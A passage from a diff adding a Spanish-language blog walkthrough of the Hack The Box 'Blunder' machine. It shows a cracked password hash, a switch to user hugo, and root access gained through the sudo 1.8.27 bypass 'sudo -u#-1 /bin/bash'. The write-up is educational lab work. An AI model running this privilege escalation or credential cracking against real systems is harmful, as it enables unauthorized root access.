+        <span class="s2">"registered"</span>: <span class="s2">"2019-11-27 07:40:55"</span>,
+        <span class="s2">"tokenRemember"</span>: <span class="s2">""</span>,
+        <span class="s2">"tokenAuth"</span>: <span class="s2">"b380cb62057e9da47afce66b4615107d"</span>,
+        <span class="s2">"tokenAuthTTL"</span>: <span class="s2">"2009-03-15 14:00"</span>,
+        <span class="s2">"twitter"</span>: <span class="s2">""</span>,
+        <span class="s2">"facebook"</span>: <span class="s2">""</span>,
+        <span class="s2">"instagram"</span>: <span class="s2">""</span>,
+        <span class="s2">"codepen"</span>: <span class="s2">""</span>,
+        <span class="s2">"linkedin"</span>: <span class="s2">""</span>,
+        <span class="s2">"github"</span>: <span class="s2">""</span>,
+        <span class="s2">"gitlab"</span>: <span class="s2">""</span><span class="o">}</span>
+<span class="o">}</span>
+www-data@blunder:/var/www<span class="err">$</span>
+</code></pre></div></div>
+
+<p>Vemos la contraseña de dicho usuario hasheada, por lo tanto vamos a rompearla con <a href="https://crackstation.net/">crackstation</a>.</p>
+
+<p><img src="/assets/images/htb-blunder/blunder-web6.png" alt="" /></p>
+
+<p>No olvidemos guardar las credenciales y trataremos de migrar a dicho usuario:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@blunder:/var/www<span class="nv">$ </span>su hugo
+Password: 
+hugo@blunder:/var/www<span class="nv">$ </span><span class="nb">whoami
+</span>hugo
+hugo@blunder:/var/www<span class="err">$</span>
+</code></pre></div></div>
+
+<p>Ya somos el usuario <strong>hugo</strong> y podemos visualizar la flag (user.txt). Ahora debemos encontrar una forma en la que podamos escalar privilegios.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>hugo@blunder:~<span class="nv">$ </span><span class="nb">id
+</span><span class="nv">uid</span><span class="o">=</span>1001<span class="o">(</span>hugo<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1001<span class="o">(</span>hugo<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>1001<span class="o">(</span>hugo<span class="o">)</span>
+hugo@blunder:~<span class="nv">$ </span><span class="nb">sudo</span> <span class="nt">-l</span>
+Password: 
+Matching Defaults entries <span class="k">for </span>hugo on blunder:
+    env_reset, mail_badpass, <span class="nv">secure_path</span><span class="o">=</span>/usr/local/sbin<span class="se">\:</span>/usr/local/bin<span class="se">\:</span>/usr/sbin<span class="se">\:</span>/usr/bin<span class="se">\:</span>/sbin<span class="se">\:</span>/bin<span class="se">\:</span>/snap/bin
+
+User hugo may run the following commands on blunder:
+    <span class="o">(</span>ALL, <span class="o">!</span>root<span class="o">)</span> /bin/bash
+hugo@blunder:~<span class="err">$</span>
+</code></pre></div></div>
+
+<p>Vemos que podemos ejecutar <code class="language-plaintext highlighter-rouge">/bin/bash</code> como cualquier usuario del sistema a excepción de <strong>root</strong>. Si investigamos un poco, vemos que nos encontramos ante sudo de version 1.8.27:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>hugo@blunder:~<span class="nv">$ </span>apt list 2&gt;/dev/null | <span class="nb">grep</span> <span class="s2">"^sudo"</span>
+sudo-ldap/eoan-updates,eoan-security 1.8.27-1ubuntu4.1 amd64
+sudo-ldap/eoan-updates,eoan-security 1.8.27-1ubuntu4.1 i386
+<span class="nb">sudo</span>/eoan-updates,eoan-security,now 1.8.27-1ubuntu4.1 amd64 <span class="o">[</span>installed]
+<span class="nb">sudo</span>/eoan-updates,eoan-security 1.8.27-1ubuntu4.1 i386
+sudoku/eoan 1.0.5-2build3 amd64
+sudoku/eoan 1.0.5-2build3 i386
+hugo@blunder:~<span class="err">$</span>
+</code></pre></div></div>
+
+<p>Y de dicha versión, existe un exploit público que nos puede ayudar a escalar privilegios:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ searchsploit <span class="nb">sudo </span>1.8.27
+<span class="nt">-----------------------------------------------------------------------------------------------</span> <span class="nt">---------------------------------</span>
+ Exploit Title                                                                                 |  Path
+<span class="nt">-----------------------------------------------------------------------------------------------</span> <span class="nt">---------------------------------</span>
+<span class="nb">sudo </span>1.8.27 - Security Bypass                                                                  | linux/local/47502.py
+<span class="nt">-----------------------------------------------------------------------------------------------</span> <span class="nt">---------------------------------</span>
+Shellcodes: No Results
+Papers: No Results
+</code></pre></div></div>
+
+<p>Dicho exploit nos dice que podemos ejecutar el comando <code class="language-plaintext highlighter-rouge">sudo -u#-1 /bin/bash</code> y que se nos otorga una shell como <strong>root</strong>. Asi que vamos a probarlo (la contraseña que nos solicita es del usuario <strong>hugo</strong>).</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>hugo@blunder:~<span class="nv">$ </span><span class="nb">sudo</span> <span class="nt">-u</span><span class="c">#-1 /bin/bash</span>
+Password: 
+root@blunder:/home/hugo# <span class="nb">whoami
+</span>root
+root@blunder:/home/hugo#
+</code></pre></div></div>
+
+<p>Ya somos el usuario <strong>root</strong> y podemos visualizar la flag (root.txt).</p>
+
+        
+      </section>
+
+      <footer class="page__meta">
+        
+        
+  
+
+
+  
+  
+  
+
+  <p class="page__taxonomy">
+    <strong><i class="fas fa-fw fa-tags" aria-hidden="true"></i> Tags: </strong>
+    <span itemprop="keywords">
+    
+      
+      
+      <a href="/tags/#account-misconfiguration" class="page__taxonomy-item" rel="tag">Account_Misconfiguration</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/tags/#bash" class="page__taxonomy-item" rel="tag">Bash</a>
+    
+    </span>
+  </p>
+
+
+
+
+  
+
+
+  
+  
+  
+
+  <p class="page__taxonomy">
+    <strong><i class="fas fa-fw fa-folder-open" aria-hidden="true"></i> Categories: </strong>
+    <span itemprop="keywords">
+    
+      
+      
+      <a href="/categories/#easy" class="page__taxonomy-item" rel="tag">Easy</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/categories/#linux" class="page__taxonomy-item" rel="tag">Linux</a>
+    
+    </span>
+  </p>
+
+
+        
+          <p class="page__date"><strong><i class="fas fa-fw fa-calendar-alt" aria-hidden="true"></i> Fecha:</strong> <time datetime="2022-03-13T00:00:00-06:00">March 13, 2022</time></p>
+        
+      </footer>
+
+      
+
+      
+  <nav class="pagination">
+    
+      <a href="/htb-cache/" class="pagination--pager" title="Hack The Box Cache
+">Previous</a>
+    
+    
+      <a href="#" class="pagination--pager disabled">Next</a>
+    
+  </nav>
+
+    </div>
+
+    
+  </article>
+
+  
+</div>
+
+    </div>
+
+    
+
+    <div class="page__footer">
+      <footer>
+        <!-- start custom footer snippets -->
+
+<!-- end custom footer snippets -->
+        <div class="page__footer-follow">
+  <ul class="social-icons">
+    
+
+    
+
+    <li><a href="/feed.xml"><i class="fas fa-fw fa-rss-square" aria-hidden="true"></i> Feed</a></li>
+  </ul>
+</div>
+
+<div class="page__footer-copyright">&copy; 2022 K4miyo</div>
+
+      </footer>
+    </div>
+
+    
+  <script src="/assets/js/main.min.js"></script>
+  <script data-search-pseudo-elements defer src="https://use.fontawesome.com/releases/v5.7.1/js/all.js" integrity="sha384-eVEQC9zshBn0rFj4+TU78eNA19HMNigMviK/PU/FFjLXqa/GKPgX58rvt5Z8PLs7" crossorigin="anonymous"></script>
+
+
+
+
+
+
+
+
+  </body>
+</html>
